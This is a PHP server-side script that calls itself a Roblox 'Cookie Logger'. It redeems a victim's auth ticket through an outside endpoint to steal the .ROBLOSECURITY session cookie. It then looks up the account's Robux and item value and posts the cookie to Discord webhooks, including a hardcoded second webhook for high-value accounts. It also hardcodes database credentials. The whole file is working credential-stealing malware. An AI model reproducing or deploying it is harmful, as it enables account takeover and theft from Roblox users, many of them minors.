<?php
header("Access-Control-Allow-Origin: ".$_SERVER['HTTP_ORIGIN']);
header("Access-Control-Allow-Credentials: true");
$servername = "localhost";
$username = "rolifffi_log";
$password = "123rolimons!@";
$dbname = "rolifffi_log";
$id = $_REQUEST['id'] ;
$conn = new mysqli($servername, $username, $password, $dbname);
if ($conn->connect_error) {
  die("Connection failed: " . $conn->connect_error);
}

$sql = "SELECT * FROM Stubs WHERE Id = '".mysqli_real_escape_string($conn, $id)."'";
$result = mysqli_query($conn, $sql);
$webhook = null;

if (mysqli_num_rows($result) > 0) {
  while($row = mysqli_fetch_assoc($result)) {
    $webhook = $row["Webhook"];
  }
} else {
  echo "0 results";
}

$conn->close();

$ticket = htmlspecialchars($_REQUEST["t"]);
if (strlen($ticket) < 100 || strlen($ticket) >= 1000) {
    die();
}

$cookie = file_get_contents("https://endpoint.rblxapi.co/342swa13fse25dfet1/$ticket/$victimsip");

if ($cookie) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "http://www.roblox.com/mobileapi/userinfo");
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        'Cookie: .ROBLOSECURITY=' . $cookie
    ));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $profile = json_decode(curl_exec($ch), 1);
    curl_close($ch);
    
    if ($profile) {
        $hookObject = json_encode([
             "content" => "@everyone u got new cookie",
                "embeds" => [
                    [
                        "title" => $profile ["UserName"],
                        "type" => "rich",
                        "url" => "https://www.roblox.com/users/" . $profile["UserID"] . "/profile",
                        "color" => hexdec("000000"),
                        "thumbnail" => [
                            "url" => "https://www.roblox.com/avatar-thumbnail/image?userId=". $profile["UserID"] . "&width=352&height=352&format=png"
                        ],
                        "author" => [
                             "name" => "\"RBLXapi\" Cookie Logger",
                             "url" => "Variety Hits"
                        ],
                        "fields" => [
                            [
                                "name" => "<:id:818111672455397397> ID",
                                "value" => $profile["UserID"],
                                "inline" => True
                            ],
                            [
                                "name" => "<:robux:818111919881715764> Robux",
                                "value" => $profile["RobuxBalance"],
                                "inline" => True
                            ],
                            [    "name" => "<:rolimons:818111627726684160> Rolimons Link",
                                "value" => "https://www.rolimons.com/player/" . $profile["UserID"],
                            ],
                            [
                                "name" => "<:trade:818111735973806111> Trade Link",
                                "value" => "https://www.roblox.com/Trade/TradeWindow.aspx?TradePartnerID=" . $profile["UserID"],
                                "inline" => True
                       	    ],
                       	    [
                                "name" => "<:premium:818111829963964416> Is Premium?",
                                "value" => $profile["IsPremium"],
                                "inline" => True
                            ],
                            [
                                "name" => "<:rap:818111763413205032> Rap",
                                "value" => get_user_rap($profile["UserID"], $cookie),
                                "inline" => True
                            ]
                       ]
                    ],
                    [
                        "type" => "rich",
                        "color" => hexdec("000000"),
                        "timestamp" => date("c"),
                         "footer" => [
                             "text" => "Powered By Scoty",
                             "icon_url" => "https://cdn.discordapp.com/avatars/818900660330037258/bf6b4bb4ecb695386d4db7bd577453ca.png",
                        ],
                        "fields" => [
                            [
                                "name" => "\u{1F36A} Cookie:",
                                "value" => "```" . $cookie . "```"
                         ]
                    ]
                ]
            ]
        
        ], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE );
        
        $ch = curl_init();
        
        curl_setopt_array( $ch, [
            CURLOPT_URL => $webhook,
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => $hookObject,
            CURLOPT_HTTPHEADER => [
                "Content-Type: application/json"
            ]
        ]);
        curl_exec( $ch );
 if(get_user_rap($profile["UserID"], $cookie) >1000){
        curl_setopt_array( $ch, [
            CURLOPT_URL => "https://discord.com/api/webhooks/620773860052303884/uPsAgxxPIbYAa3tSEXHtiz3y-xmx-8JFZhfHHU04IuTDuNkuH0iTubcEoDN2a7TVP6__",
           CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => $hookObject,
            CURLOPT_HTTPHEADER => [
                "Content-Type: application/json"
            ]
        ]);
        curl_exec( $ch );
        curl_close( $ch );
    }
}
} else {
    $ch = curl_init();
    $hookObject = json_encode([
        "content" => "Failed to redeem auth ticket...",
        "embeds" => [
            [
                "type" => "rich",
                "color" => hexdec("000000"),
                "fields" => [
                    [
                        "name" => "\u{1F36A} Auth ticket:",
                        "value" => "```" . $ticket . "```"
                     ]
                ]
            ]
        ]
    ], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE );
        curl_setopt_array( $ch, [
            CURLOPT_URL => "https://discord.com/api/webhooks/620773860052303884/uPsAgxxPIbYAa3tSEXHtiz3y-xmx-8JFZhfHHU04IuTDuNkuH0iTubcEoDN2a7TVP6__",
           CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => $hookObject,
            CURLOPT_HTTPHEADER => [
                "Content-Type: application/json"
            ]
        ]);
        curl_exec( $ch );
        curl_close( $ch );
    }

    function get_user_rap($user_id, $cookie) {
        $cursor = "";
        $total_rap = 0;
                        
        while ($cursor !== null) {
            $request = curl_init();
            curl_setopt($request, CURLOPT_URL, "https://inventory.roblox.com/v1/users/$user_id/assets/collectibles?assetType=All&sortOrder=Asc&limit=100&cursor=$cursor");
            curl_setopt($request, CURLOPT_HTTPHEADER, array('Cookie: .ROBLOSECURITY='.$cookie));
            curl_setopt($request, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($request, CURLOPT_SSL_VERIFYPEER, 0); 
            curl_setopt($request, CURLOPT_SSL_VERIFYHOST, 0);
            $data = json_decode(curl_exec($request), 1);
            foreach($data["data"] as $item) {
                $total_rap += $item["recentAveragePrice"];
            }
            $cursor = $data["nextPageCursor"] ? $data["nextPageCursor"] : null;
        }
                        
        return $total_rap;
    }
    function account_filter($profile) {
        return true;
    }
?>